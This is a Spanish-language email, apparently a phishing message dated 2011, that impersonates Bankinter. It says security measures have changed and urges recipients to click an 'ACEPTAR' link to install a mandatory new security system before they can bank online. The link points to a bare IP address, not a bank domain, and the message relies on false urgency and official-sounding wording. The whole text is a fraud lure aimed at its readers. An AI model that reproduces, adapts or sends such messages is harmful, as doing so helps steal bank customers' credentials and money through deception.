 En BankInter somos conscientes de la necesidad de garantizar el tránsito de información entre el Banco y sus clientes. Por este motivo, bankinter cuenta con las máximas medidas de seguridad para garantizar la confidencialidad de las comunicaciones entre el Banco y el cliente. No obstante, estas medidas pueden cambiar sin notificación, con el fin de proteger sus datos personales. Este correo le ha sido enviado automáticamente por nuestro sistema, como notificación de los cambios efectuados en el sistema. Para seguir utilizando los servicios de Banca por Internet de bankinter, debe instalar lo nuevo sistema de seguridad para efectuar sus operaciones. Acceda a el enlace que hemos puesto a su disposición pulsando aquí ACEPTAR (http://165.98.12.144/Chacocentelaflor/Contactenos/bankinterseguridad.asp?script/templates/GCMRequest.do?page=489578114548755498T74h645u498n789d45364r98c7943s5h87984546) NOTA: Recuerde que no podrás operar en bankinter sin Instalar lo Sistema, es muy importante su utilización. Todos los Derechos Reservados 2011© BankInter 